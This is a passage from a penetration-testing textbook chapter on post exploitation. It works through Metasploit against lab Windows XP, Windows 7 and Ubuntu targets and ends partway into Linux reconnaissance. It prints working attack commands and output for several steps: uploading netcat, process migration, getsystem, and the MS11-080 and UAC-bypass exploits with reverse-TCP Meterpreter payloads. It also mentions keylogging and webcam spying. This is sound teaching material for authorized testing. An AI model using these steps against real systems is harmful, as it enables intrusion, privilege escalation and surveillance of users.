<html><head></head><body><section class="chapter" epub:type="chapter" id="post_exploitation-id00036" title="Chapter&#xA0;13.&#xA0;Post Exploitation"><div class="titlepage"><div><div><h2 class="title">Chapter 13. Post Exploitation</h2></div></div></div><p><a class="indexterm" id="iddle1969"/>We’ve gained access to our target systems, so our penetration test is over, right? We can tell our client that we got a shell on their systems.</p><p>But so what? Why would the client care?</p><p>In the post-exploitation phase, we will look at information gathering on the exploited systems, privilege escalation, and moving from system to system. Perhaps we’ll find that we can access sensitive data stored on the exploited system or that we have network access to additional systems that we can use to gain further access to company data. Maybe the exploited system is part of a domain, and we can use it to access other systems on the domain. These are just a few of the potential avenues open to us in post exploitation.</p><p>Post exploitation is arguably the most important way to get a clear picture of a client’s security posture. For example, in <a class="xref" href="ch09.xhtml" title="Chapter 9. Password Attacks">Chapter 9</a>, I mentioned a pentest in which I used access to a decommissioned Windows 2000 domain controller to gain complete administrative control over a domain. If I hadn’t used post-exploitation techniques, I might have instead concluded that the Windows 2000 system stored no sensitive information and that it wasn’t <a class="indexterm" id="iddle1472"/><a class="indexterm" id="iddle1710"/><a class="indexterm" id="iddle1712"/><a class="indexterm" id="iddle1976"/>connected to other systems in a domain. My pentest would not have been nearly as successful, and my client wouldn’t have gotten as good of a picture of their vulnerabilities, especially when it came to password policies.</p><p>This chapter will cover the basics of post exploitation. As you move beyond this book and increase your skills as a pentester, you should spend a good deal of time on post exploitation. Solid post-exploitation skills differentiate good pentesters from the truly great.</p><p>Now let’s look at some of our post-exploitation options in Metasploit.</p><div class="sect1" title="Meterpreter"><div class="titlepage"><div><div><h2 class="title" id="meterpreter-id00037" style="clear: both">Meterpreter</h2></div></div></div><p>We discussed Meterpreter, Metasploit’s custom payload, in <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a>. Now let’s dig deeper and look at some of Meterpreter’s functionality.</p><p>We’ll begin post exploitation by opening a Meterpreter session on each of our target systems. As you can see in <a class="xref" href="ch13.xhtml#open_metasploit_sessions_on_our_targets" title="Example 13-1. Open Metasploit sessions on our targets">Example 13-1</a>, I have a session on the Windows XP target from the MS08-067 exploit. On the Windows 7 target, I used a trojan executable like those we used in the previous chapter. On the Linux target, I used the TikiWiki PHP vulnerability we exploited in <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a>. You can also log in to the Linux target via SSH using either the password for <span class="emphasis"><em>georgia</em></span> we cracked in <a class="xref" href="ch09.xhtml" title="Chapter 9. Password Attacks">Chapter 9</a> (password) or the SSH public key we added in <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a> using the open NFS share.</p><div class="example"><a id="open_metasploit_sessions_on_our_targets"/><div class="example-title">Example 13-1. Open Metasploit sessions on our targets</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>sessions -l</strong></span>&#13;
&#13;
Active sessions&#13;
===============&#13;
&#13;
  Id  Type                   Information                            Connection&#13;
  --  ----                   -----------                            ----------&#13;
  1   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ BOOKXP           192.168.20.9:4444 -&gt;&#13;
                                                                      192.168.20.10:1104&#13;
                                                                      (192.168.20.10)&#13;
  2   meterpreter x86/win32  Book-Win7\Georgia Weidman @ Book-Win7  192.168.20.9:2345 -&gt;&#13;
                                                                      192.168.20.12:49264&#13;
                                                                      (192.168.20.12)&#13;
  3   meterpreter php/php    www-data (33) @ ubuntu                 192.168.20.9:4444 -&gt;&#13;
                                                                      192.168.20.11:48308&#13;
                                                                      (192.168.20.11)</pre></div></div><p>Start by interacting with your Windows XP session as shown here.</p><a id="pro_id00146"/><pre class="programlisting">msf post(enum_logged_on_users) &gt; <span class="strong"><strong>sessions -i 1</strong></span></pre><p>We’ve already seen a couple of Meterpreter commands throughout the book. Namely, in <a class="xref" href="ch09.xhtml" title="Chapter 9. Password Attacks">Chapter 9</a>, we used <code class="literal">hashdump</code> to get direct access to local password hashes in on <a class="xref" href="ch09.xhtml#offline_password_attacks" title="Offline Password Attacks">Offline Password Attacks</a>. To see a list of available Meterpreter commands, enter <code class="literal">help</code> in the Meterpreter console. For more details about a specific command, enter <code class="literal">command -h</code>.</p><div class="sect2" title="Using the upload Command"><div class="titlepage"><div><div><h3 class="title" id="using_the_upload_command">Using the upload Command</h3></div></div></div><p><a class="indexterm" id="iddle1442"/><a class="indexterm" id="iddle1475"/><a class="indexterm" id="iddle1720"/><a class="indexterm" id="iddle2330"/>Perhaps nothing is quite so annoying on a pentest as finding yourself on a Windows machine without access to utilities such as <code class="literal">wget</code> and <code class="literal">curl</code> to pull down files from a web server. In <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a>, we saw a way to bypass this problem with TFTP, but Meterpreter easily solves the problem for us. With a simple command, <code class="literal">help upload</code>, we can upload files to the target, as shown in <a class="xref" href="ch13.xhtml#meterpreter_help_command" title="Example 13-2. Meterpreter help command">Example 13-2</a>.</p><div class="example"><a id="meterpreter_help_command"/><div class="example-title">Example 13-2. Meterpreter help command</div><div class="example-contents"><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>help upload</strong></span>&#13;
Usage: upload [options] src1 src2 src3 ... destination&#13;
&#13;
Uploads local files and directories to the remote machine.&#13;
&#13;
OPTIONS:&#13;
&#13;
    -h        Help banner.&#13;
    -r        Upload recursively.</pre></div></div><p>This help information tells us that we can use <code class="literal">upload</code> to copy files from our Kali system to the Windows XP target.</p><p>For example, here’s how to upload Netcat for Windows:</p><a id="pro_id00147"/><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>upload /usr/share/windows-binaries/nc.exe C:\\</strong></span>&#13;
[*] uploading  : /usr/share/windows-binaries/nc.exe -&gt; C:\&#13;
[*] uploaded   : /usr/share/windows-binaries/nc.exe -&gt; C:\\nc.exe</pre><div class="note" title="Note"><h3 class="title"><a id="ch13note01"/>Note</h3><p>Remember to escape the backslash characters in the path with a second backslash. Also remember that if you upload anything to a target during a pentest or otherwise change the target system, record your changes so you can undo them before the engagement is over. The last thing you want to do is leave an environment more vulnerable than when you found it.</p></div></div><div class="sect2" title="getuid"><div class="titlepage"><div><div><h3 class="title" id="getuid">getuid</h3></div></div></div><p>Another useful Meterpreter command is <code class="literal">getuid</code>. This command will tell you the name of the <span class="emphasis"><em>System</em></span> user running Meterpreter. Typically, Meterpreter runs with the privileges of the exploited process or user.</p><p>For example, when we exploit an SMB server with the MS08-067 exploit, we’re running on the target with the privileges of the SMB server, namely the Windows <span class="emphasis"><em>System</em></span> account, as shown here.</p><a id="pro_id00148"/><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>getuid</strong></span>&#13;
Server username: NT AUTHORITY\SYSTEM</pre><p>On the Windows 7 target, we social-engineered the user into running a trojaned program that connected back to Metasploit, so Meterpreter is running as the user <span class="emphasis"><em>Georgia Weidman</em></span>.</p></div><div class="sect2" title="Other Meterpreter Commands"><div class="titlepage"><div><div><h3 class="title" id="other_meterpreter_commands">Other Meterpreter Commands</h3></div></div></div><p><a class="indexterm" id="iddle1713"/><a class="indexterm" id="iddle2094"/>Before moving on, take some time to work with additional Meterpreter commands. You’ll find many useful commands for local information gathering, remote control, and even spying on local users, such as keylogging and turning on a webcam from a Meterpreter session.</p></div></div><div class="sect1" title="Meterpreter Scripts"><div class="titlepage"><div><div><h2 class="title" id="meterpreter_scripts" style="clear: both">Meterpreter Scripts</h2></div></div></div><p>In addition to Meterpreter commands, you can also run Meterpreter scripts from a Meterpreter console. The scripts currently available can be found in Kali at <span class="emphasis"><em>/usr/share/metasploit-framework/scripts/meterpreter</em></span>. These scripts are written in Ruby, and you can write your own and submit them for inclusion in the framework. To use a Meterpreter script, enter <code class="literal">run</code> <span class="emphasis"><em><code class="literal">&lt;script name&gt;</code></em></span>. Use the <code class="literal">-h</code> flag to see help information for a script.</p><p>When exploiting Internet Explorer in <a class="xref" href="ch10.xhtml" title="Chapter 10. Client-Side Exploitation">Chapter 10</a>, we used the <code class="literal">AutoRunScript</code> option to automatically run the <span class="emphasis"><em>migrate</em></span> script to spawn a new process and migrate into it before the browser crashed. We can run this script directly inside Meterpreter as well. For example, entering <span class="strong"><strong><code class="literal">run migrate -h</code></strong></span>, as shown in <a class="xref" href="ch13.xhtml#migrate_script_help_information" title="Example 13-3. Migrate script help information">Example 13-3</a>, gives us information on the <span class="emphasis"><em>migrate</em></span> Meterpreter script.</p><div class="example"><a id="migrate_script_help_information"/><div class="example-title">Example 13-3. Migrate script help information</div><div class="example-contents"><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>run migrate -h</strong></span>&#13;
&#13;
OPTIONS:&#13;
&#13;
    -f        Launch a process and migrate into the new process&#13;
    -h        Help menu.&#13;
    -k        Kill original process.&#13;
    -n &lt;opt&gt;  Migrate into the first process with this executable name (explorer.exe)&#13;
    -p &lt;opt&gt;  PID to migrate to.</pre></div></div><p>Because we’re not racing to beat a session before it closes, we have a few different options for which process to migrate to. We can migrate to a process by name using the <code class="literal">-n</code> option. For example, to migrate to the first instance of <span class="emphasis"><em>explorer.exe</em></span> that Meterpreter encounters in the process list, we can use <code class="literal">-n explorer.exe</code>.</p><p>You can also migrate to a process by using its process ID (PID) with the <code class="literal">-p</code> option. Use Meterpreter’s <code class="literal">ps</code> command to see a list of running processes, as shown in <a class="xref" href="ch13.xhtml#running_process_list" title="Example 13-4. Running process list">Example 13-4</a>.</p><div class="example"><a id="running_process_list"/><div class="example-title">Example 13-4. Running process list</div><div class="example-contents"><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>ps</strong></span>&#13;
&#13;
Process List&#13;
============&#13;
&#13;
 PID   PPID  Name              Arch  Session     User                    Path&#13;
 ---   ----  ----              ----  -------     ----                    ----&#13;
 0     0     [System Process]        4294967295&#13;
 4     0     System            x86   0           NT AUTHORITY\SYSTEM&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
 1144  1712  explorer.exe      x86   0           BOOKXP\georgia          C:\WINDOWS\Explorer.EXE&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
 1204  1100  wscntfy.exe       x86   0           BOOKXP\georgia</pre></div></div><p><a class="indexterm" id="iddle1443"/><a class="indexterm" id="iddle1688"/><a class="indexterm" id="iddle1694"/><a class="indexterm" id="iddle1975"/><a class="indexterm" id="iddle1978"/><span class="emphasis"><em>Explorer.exe</em></span> is a solid choice. Choose PID <code class="literal">1144</code> for <span class="emphasis"><em>explorer.exe</em></span>, and run the Meterpreter <span class="emphasis"><em>migrate</em></span> script as shown in <a class="xref" href="ch13.xhtml#running_the_migrate_script" title="Example 13-5. Running the migrate script">Example 13-5</a>.</p><div class="example"><a id="running_the_migrate_script"/><div class="example-title">Example 13-5. Running the migrate script</div><div class="example-contents"><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>run migrate -p 1144</strong></span>&#13;
[*] Migrating from 1100 to 1144...&#13;
[*] Migration completed successfully.&#13;
meterpreter &gt; <span class="strong"><strong>getuid</strong></span>&#13;
Server username: BOOKXP\georgia</pre></div></div><p>Meterpreter successfully migrates into the <span class="emphasis"><em>explorer.exe</em></span> process. Now if the SMB server happens to become unstable or die, our Meterpreter session is safe.</p><p>If you ran the <code class="literal">getuid</code> command again, you would see that we are no longer running as the <span class="emphasis"><em>System</em></span> user but as user <span class="emphasis"><em>georgia</em></span>. This makes sense because this process belongs to the logged-in user <span class="emphasis"><em>georgia</em></span>. By moving into this process, we’ve effectively dropped our privileges down to user <span class="emphasis"><em>georgia</em></span>.</p><p>Let’s stay logged in as user <span class="emphasis"><em>georgia</em></span> on the XP target and look at some ways to elevate our privileges to <span class="emphasis"><em>System</em></span> on Windows targets and <span class="emphasis"><em>root</em></span> on the Linux target through local privilege-escalation attacks.</p></div><div class="sect1" title="Metasploit Post-Exploitation Modules"><div class="titlepage"><div><div><h2 class="title" id="metasploit_post-exploitation_modules" style="clear: both">Metasploit Post-Exploitation Modules</h2></div></div></div><p>So far we’ve used Metasploit modules for information gathering, vulnerability identification, and exploitation. It should come as no surprise that the framework has a plethora of useful modules for the post-exploitation phase as well. Metasploit’s <span class="emphasis"><em>post</em></span> directory contains modules for local information gathering, remote control, privilege escalation, and so on, which span multiple platforms.</p><p><a class="indexterm" id="iddle1982"/>For example, consider the module <span class="emphasis"><em>post/windows/gather/enum_logged_on_users</em></span>. As shown in <a class="xref" href="ch13.xhtml#running_a_metasploit_post_module" title="Example 13-6. Running a Metasploit post module">Example 13-6</a>, this module will show us which users are currently logged on to the target system. Put your session in the background (with <span class="smaller">ctrl</span>-Z or <code class="literal">background</code>) to return to the main Msfconsole prompt.</p><div class="example"><a id="running_a_metasploit_post_module"/><div class="example-title">Example 13-6. Running a Metasploit post module</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use post/windows/gather/enum_logged_on_users</strong></span>&#13;
msf post(enum_logged_on_users) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (post/windows/gather/enum_logged_on_users):&#13;
&#13;
   Name     Current Setting  Required  Description&#13;
   ----     ---------------  --------  -----------&#13;
   CURRENT  true             yes       Enumerate currently logged on users&#13;
   RECENT   true             yes       Enumerate Recently logged on users&#13;
  ❶SESSION                   yes       The session to run this module on.&#13;
msf post(enum_logged_on_users) &gt; <span class="strong"><strong>set SESSION 1</strong></span>&#13;
SESSION =&gt; 1&#13;
msf post(enum_logged_on_users) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] Running against session 1&#13;
&#13;
Current Logged Users&#13;
====================&#13;
&#13;
 SID                                          User&#13;
 ---                                          ----&#13;
 S-1-5-21-299502267-308236825-682003330-1003  BOOKXP\georgia&#13;
&#13;
&#13;
[*] Results saved in: /root/.msf4/loot/20140324121217_default_192.168.20.10_host.users.activ&#13;
_791806.txt ❷&#13;
&#13;
Recently Logged Users&#13;
=====================&#13;
&#13;
 SID                                          Profile Path&#13;
 ---                                          ------------&#13;
 S-1-5-18                                     %systemroot%\system32\config\systemprofile&#13;
 S-1-5-19                                     %SystemDrive%\Documents and Settings\LocalService&#13;
 S-1-5-20                                     %SystemDrive%\Documents and Settings\NetworkService&#13;
 S-1-5-21-299502267-308236825-682003330-1003  %SystemDrive%\Documents and Settings\georgia</pre></div></div><p>We use post modules as we do all Metasploit modules: We set the relevant options, and then enter <span class="strong"><strong><code class="literal">exploit</code></strong></span> to run the module. However, in the case of post-exploitation modules, instead of setting an <code class="literal">RHOST</code> or <code class="literal">SRVHOST</code>, we need to tell Metasploit the Session ID we want to run the post-exploitation module against ❶. We then run the module against Session 1, the Windows XP target.</p><p><a class="indexterm" id="iddle1055"/><a class="indexterm" id="iddle1440"/><a class="indexterm" id="iddle1637"/><a class="indexterm" id="iddle1726"/><a class="indexterm" id="iddle1974"/><a class="indexterm" id="iddle2034"/><a class="indexterm" id="iddle2134"/><a class="indexterm" id="iddle2462"/>The module returns data telling us the user <span class="emphasis"><em>georgia</em></span> is currently logged in. Metasploit automatically saves the output to a file <span class="emphasis"><em>/root/.msf4/loot/20140324121217_default_192.168.20.10_host.users.activ_791806.txt</em></span> ❷.</p></div><div class="sect1" title="Railgun"><div class="titlepage"><div><div><h2 class="title" id="railgun" style="clear: both">Railgun</h2></div></div></div><p>Railgun is an extension for Meterpreter that allows direct access to Windows APIs. It can be used inside post-exploitation modules for Meterpreter as well as the Ruby shell (<code class="literal">irb</code>) in a Meterpreter session. For example, we can check if the session is running as an administrative user by directly accessing the <code class="literal">IsUserAnAdmin</code> function of the <span class="emphasis"><em>shell32</em></span> Windows DLL, as shown here. Be sure to bring a session to the foreground with <code class="literal">sessions -i</code> <span class="emphasis"><em><code class="literal">&lt;session id&gt;</code></em></span> first.</p><a id="pro_id00149"/><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>irb</strong></span>&#13;
[*] Starting IRB shell&#13;
[*] The 'client' variable holds the meterpreter client&#13;
&gt;&gt; <span class="strong"><strong>client.railgun.shell32.IsUserAnAdmin</strong></span>&#13;
=&gt; {"GetLastError"=&gt;0, "Error Message"=&gt;"The operation completed successfully.", "return"=&gt;true}</pre><p>First, we drop into a Ruby shell with the command <code class="literal">irb</code>. Note that the <code class="literal">client</code> variable holds the Meterpreter client. Next we enter <span class="strong"><strong><code class="literal">client.railgun.shell32.IsUserAnAdmin</code></strong></span> to tell the Ruby interpreter to use Railgun on the current Meterpreter session and access the <code class="literal">IsUserAdmin</code> function of <span class="emphasis"><em>shell32.dll</em></span>. (For additional Railgun examples, check out Metasploit post modules such as <span class="emphasis"><em>windows/gather/reverse_lookup.rb</em></span> and <span class="emphasis"><em>windows/manage/download_exec.rb</em></span>, which also leverage this functionality.) Enter <span class="strong"><strong><code class="literal">exit</code></strong></span> to drop out of the Ruby interpreter and return to Meterpreter.</p></div><div class="sect1" title="Local Privilege Escalation"><div class="titlepage"><div><div><h2 class="title" id="local_privilege_escalation" style="clear: both">Local Privilege Escalation</h2></div></div></div><p>In the following sections, we’ll explore examples of <span class="emphasis"><em>local privilege escalation</em></span>, which involves running exploits to gain additional control of the system after exploitation.</p><p>Just like network software and client-side software, privileged local processes can be subject to exploitable security issues. Some of your attacks may not result in gaining the privileges you would like. Gaining command execution through a website, compromising a user account without administrative rights, or exploiting a listening service with limited privileges can all lead to system access, but you may find yourself still working as a limited user. To get the privileges we want, we will need to exploit further issues.</p><div class="sect2" title="getsystem on Windows"><div class="titlepage"><div><div><h3 class="title" id="getsystem_on_windows">getsystem on Windows</h3></div></div></div><p>Meterpreter’s <code class="literal">getsystem</code> command automates trying a series of known local privilege-escalation exploits against the target. The command’s options are shown in <a class="xref" href="ch13.xhtml#getsystem_help" title="Example 13-7. getsystem help">Example 13-7</a>.</p><div class="example"><a id="getsystem_help"/><div class="example-title">Example 13-7. <code class="literal">getsystem</code> help</div><div class="example-contents"><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>getsystem -h</strong></span>&#13;
Usage: getsystem [options]&#13;
&#13;
Attempt to elevate your privilege to that of local system.&#13;
&#13;
OPTIONS:&#13;
&#13;
    -h Help Banner.&#13;
    -t &lt;opt&gt;  The technique to use. (Default to '0').&#13;
        0 : All techniques available&#13;
        1 : Service - Named Pipe Impersonation (In Memory/Admin)&#13;
        2 : Service - Named Pipe Impersonation (Dropper/Admin)&#13;
        3 : Service - Token Duplication (In Memory/Admin)</pre></div></div><p><a class="indexterm" id="iddle1387"/><a class="indexterm" id="iddle1638"/><a class="indexterm" id="iddle2072"/><a class="indexterm" id="iddle2488"/>As shown here, running <code class="literal">getsystem</code> with no arguments will run a series of local exploits until one succeeds or all known exploits are exhausted. To run a particular exploit, use the <code class="literal">-t</code> option followed by the exploit number.</p><p>Here we run <code class="literal">getsystem</code> on our Windows XP target with no arguments.</p><a id="pro_id00150"/><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>getsystem</strong></span>&#13;
...got system (via technique 1).&#13;
meterpreter &gt; <span class="strong"><strong>getuid</strong></span>&#13;
Server username: NT AUTHORITY\SYSTEM</pre><p>As you can see, Meterpreter gained system privileges with the first exploit it tried. With one command, we are able to elevate our privileges from <span class="emphasis"><em>georgia</em></span> to <span class="emphasis"><em>System</em></span>.</p></div><div class="sect2" title="Local Escalation Module for Windows"><div class="titlepage"><div><div><h3 class="title" id="local_escalation_module_for_windows">Local Escalation Module for Windows</h3></div></div></div><p>Local exploit modules in Metasploit allow you to run an exploit on an open session to gain additional access. The local privilege-escalation module <span class="emphasis"><em>exploit/windows/local/ms11_080_afdjoinleaf</em></span> in <a class="xref" href="ch13.xhtml#metasploit_local_exploit" title="Example 13-8. Metasploit local exploit">Example 13-8</a> exploits a (now-patched) flaw in the <code class="literal">Afdjoinleaf</code> function of the <span class="emphasis"><em>afd.sys</em></span> Windows driver. Like post-exploitation modules, use the <code class="literal">SESSION</code> option to denote which open session the exploit should be run against. We’ll run the module against our Windows XP session. Unlike post modules, local exploits are exploits, so we’ll need to set a payload. If it succeeds, our exploit will open a new session with System privileges. In your Windows XP Meterpreter session, run the command <span class="strong"><strong><code class="literal">rev2self</code></strong></span> to drop back down to the user <span class="emphasis"><em>georgia</em></span> before using this alternative privilege-escalation technique.</p><div class="example"><a id="metasploit_local_exploit"/><div class="example-title">Example 13-8. Metasploit local exploit</div><div class="example-contents"><pre class="programlisting">msf post(enum_logged_on_users) &gt; <span class="strong"><strong>use exploit/windows/local/ms11_080_afdjoinleaf</strong></span>&#13;
msf exploit(ms11_080_afdjoinleaf) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/windows/local/ms11_080_afdjoinleaf):&#13;
&#13;
   Name     Current Setting  Required  Description&#13;
   ----     ---------------  --------  -----------&#13;
   SESSION                   yes       The session to run this module on.&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
msf exploit(ms11_080_afdjoinleaf) &gt; <span class="strong"><strong>set SESSION 1</strong></span>&#13;
SESSION =&gt; 1&#13;
msf exploit(ms11_080_afdjoinleaf) &gt; <span class="strong"><strong>set payload windows/meterpreter/reverse_tcp</strong></span>&#13;
payload =&gt; windows/meterpreter/reverse_tcp&#13;
msf exploit(ms11_080_afdjoinleaf) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>&#13;
LHOST =&gt; 192.168.20.9&#13;
msf exploit(ms11_080_afdjoinleaf) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] Started reverse handler on 192.168.20.9:4444&#13;
[*] Running against Windows XP SP2 / SP3&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
[*] Writing 290 bytes at address 0x00f70000&#13;
[*] Sending stage (751104 bytes) to 192.168.20.10&#13;
[*] Restoring the original token...&#13;
[*] Meterpreter session 4 opened (192.168.20.9:4444 -&gt; 192.168.20.10:1108) at 2015-08-14 01:59:46 -0400&#13;
&#13;
meterpreter &gt;</pre></div></div><p><a class="indexterm" id="iddle1021"/><a class="indexterm" id="iddle2321"/><a class="indexterm" id="iddle2333"/><a class="indexterm" id="iddle2474"/>After you enter <span class="strong"><strong><code class="literal">exploit</code></strong></span>, Metasploit runs the exploit in our Windows XP session. If it succeeds, you should receive another Meterpreter session. If you run <code class="literal">getuid</code> on this new session, you should see that you’ve once again obtained System privileges.</p><div class="note" title="Note"><h3 class="title"><a id="ch13note02"/>Note</h3><p>Remember, to succeed, local privilege-escalation attacks rely on a flaw such as a missing patch or security misconfiguration. A fully updated and locked-down system would not be vulnerable to the MS11-08 exploit because a vendor patch was released in 2011.</p></div></div><div class="sect2" title="Bypassing UAC on Windows"><div class="titlepage"><div><div><h3 class="title" id="bypassing_uac_on_windows">Bypassing UAC on Windows</h3></div></div></div><p>Now let’s see how to escalate our privileges on our more secure Windows 7 target, which has additional security features including <span class="emphasis"><em>user account control (UAC)</em></span>. Applications running on Windows Vista and higher are limited to using regular user privileges. If an application needs to use administrative privileges, an administrative user has to approve the elevation. (You’ve probably seen the warning notice from UAC when an application wants to make changes.)</p><p>Because we gained this session by having user <span class="emphasis"><em>Georgia Weidman</em></span> run a malicious binary, the Meterpreter session currently has the privileges of Georgia Weidman. Try using <code class="literal">getsystem</code> against this target, as shown in <a class="xref" href="ch13.xhtml#getsystem_fails_on_windows_7" title="Example 13-9. getsystem fails on Windows 7">Example 13-9</a>.</p><div class="example"><a id="getsystem_fails_on_windows_7"/><div class="example-title">Example 13-9. <code class="literal">getsystem</code> fails on Windows 7</div><div class="example-contents"><pre class="programlisting">msf exploit(ms11_080_afdjoinleaf) &gt; <span class="strong"><strong>sessions -i 2</strong></span>&#13;
[*] Starting interaction with 2...&#13;
meterpreter &gt; <span class="strong"><strong>getuid</strong></span>&#13;
Server username: Book-Win7\Georgia Weidman&#13;
meterpreter &gt; <span class="strong"><strong>getsystem</strong></span>&#13;
[-] priv_elevate_getsystem: Operation failed: Access is denied.</pre></div></div><p><a class="indexterm" id="iddle2491"/>As you can see, running <code class="literal">getsystem</code> against this target fails and gives an error message. Perhaps this system is fully patched and hardened to the point where none of the exploitation techniques in <code class="literal">getsystem</code> will work.</p><p>But as it turns out, our Windows 7 target has not been patched since installation; UAC is stopping <code class="literal">getsystem</code> from working properly.</p><p>As with any computer security control, researchers have developed multiple techniques to bypass the UAC control. One such technique is included in Metasploit in the local exploit <span class="emphasis"><em>windows/local/bypassuac</em></span>. Background the session and run this exploit on your Windows 7 session, as shown in <a class="xref" href="ch13.xhtml#using_a_module_to_bypass_the_uac_control" title="Example 13-10. Using a module to bypass the UAC control">Example 13-10</a>. Use the exploit module, set the <code class="literal">SESSION</code> option, and so on.</p><div class="example"><a id="using_a_module_to_bypass_the_uac_control"/><div class="example-title">Example 13-10. Using a module to bypass the UAC control</div><div class="example-contents"><pre class="programlisting">msf exploit(ms11_080_afdjoinleaf) &gt; <span class="strong"><strong>use exploit/windows/local/bypassuac</strong></span>&#13;
msf exploit(bypassuac) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/windows/local/bypassuac):&#13;
&#13;
   Name     Current Setting  Required  Description&#13;
   ----     ---------------  --------  -----------&#13;
   SESSION                   yes       The session to run this module&#13;
msf exploit(bypassuac) &gt; <span class="strong"><strong>set SESSION 2</strong></span>&#13;
SESSION =&gt; 2&#13;
msf exploit(bypassuac) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] Started reverse handler on 192.168.20.9:4444&#13;
[*] UAC is Enabled, checking level...&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
[*] Uploaded the agent to the filesystem....&#13;
[*] Sending stage (751104 bytes) to 192.168.20.12&#13;
[*] Meterpreter session 5 opened (192.168.20.9:4444 -&gt; 192.168.20.12:49265) at 2015-08-14 02:17:05 -0400&#13;
[-] Exploit failed: Rex::TimeoutError Operation timed out. ❶&#13;
&#13;
meterpreter &gt; <span class="strong"><strong>getuid</strong></span>&#13;
Server username: Book-Win7\Georgia Weidman</pre></div></div><p>The module uses a trusted publisher certificate through process injection to bypass the UAC controls. As you can see from the results of the <code class="literal">getui</code><code class="literal">d</code> command, though our new session is still running as user <span class="emphasis"><em>Georgia Weidman</em></span>, we’re no longer restricted by UAC. If it was successful you will again be presented with a new session. Don’t worry if you see the line at ❶. As long as the new Meterpreter session opens, the attack was successful.</p><p>As shown next, having gotten UAC out of the way, <code class="literal">getsystem</code> has no trouble gaining system privileges.</p><a id="pro_id00151"/><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>getsystem</strong></span>&#13;
...got system (via technique 1).</pre></div><div class="sect2" title="Udev Privilege Escalation on Linux"><div class="titlepage"><div><div><h3 class="title" id="udev_privilege_escalation_on_linux">Udev Privilege Escalation on Linux</h3></div></div></div><p><a class="indexterm" id="iddle1623"/><a class="indexterm" id="iddle1624"/><a class="indexterm" id="iddle1626"/><a class="indexterm" id="iddle1648"/><a class="indexterm" id="iddle1719"/><a class="indexterm" id="iddle2085"/><a class="indexterm" id="iddle2140"/><a class="indexterm" id="iddle2328"/>We have yet to try privilege escalation on our Linux target. Let’s mix things up a bit and use public exploit code instead of Metasploit to perform a local privilege-escalation attack on Linux.</p><p>We have two ways to interact with our Linux target: via SSH and by using the TikiWiki to gain a Meterpreter shell. The Linux Meterpreter has fewer available commands than Windows Meterpreter, but in both cases we use the <code class="literal">shell</code> command to drop out of Meterpreter and into a regular command shell, as shown in <a class="xref" href="ch13.xhtml#dropping_to_a_shell_in_meterpreter" title="Example 13-11. Dropping to a shell in Meterpreter">Example 13-11</a>.</p><div class="example"><a id="dropping_to_a_shell_in_meterpreter"/><div class="example-title">Example 13-11. Dropping to a shell in Meterpreter</div><div class="example-contents"><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>shell</strong></span>&#13;
Process 13857 created.&#13;
Channel 0 created.&#13;
<span class="strong"><strong>whoami</strong></span>&#13;
www-data</pre></div></div><p>We see that our TikiWiki exploit gained us a session as the user <span class="emphasis"><em>www-data</em></span>, a limited account for the web server, but we have a long way to get to root. We have also gained a Bash shell as the user <span class="emphasis"><em>georgia</em></span> through SSH in <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a> with more privileges than <span class="emphasis"><em>www-data</em></span>, but we’re still not the coveted root.</p><div class="sect3" title="Finding a Vulnerability"><div class="titlepage"><div><div><h4 class="title" id="finding_a_vulnerability">Finding a Vulnerability</h4></div></div></div><p>We need to find a local privilege-escalation vulnerability to exploit. First, we need a bit of information about the local system, such as the version of the installed kernel and the Ubuntu version. You can find out the Linux kernel version with the command <code class="literal">uname -a</code> and the Ubuntu release version with the command <code class="literal">lsb_release -a</code>, as shown in <a class="xref" href="ch13.xhtml#gathering_local_information" title="Example 13-12. Gathering local information">Example 13-12</a>.</p><div class="example"><a id="gathering_local_information"/><div class="example-title">Example 13-12. Gathering local information</div><div class="example-contents"><pre class="programlisting"><span class="strong"><strong>uname -a</strong></span>&#13;
Linux ubuntu 2.6.27-7-generic #1 SMP Fri Oct 24 06:42:44 UTC 2008 i686 GNU/Linux&#13;
<span class="strong"><strong>lsb_release -a</strong></span>&#13;
Distributor ID: Ubuntu&#13;
Description: Ubuntu 8.10&#13;
Release: 8.10&#13;
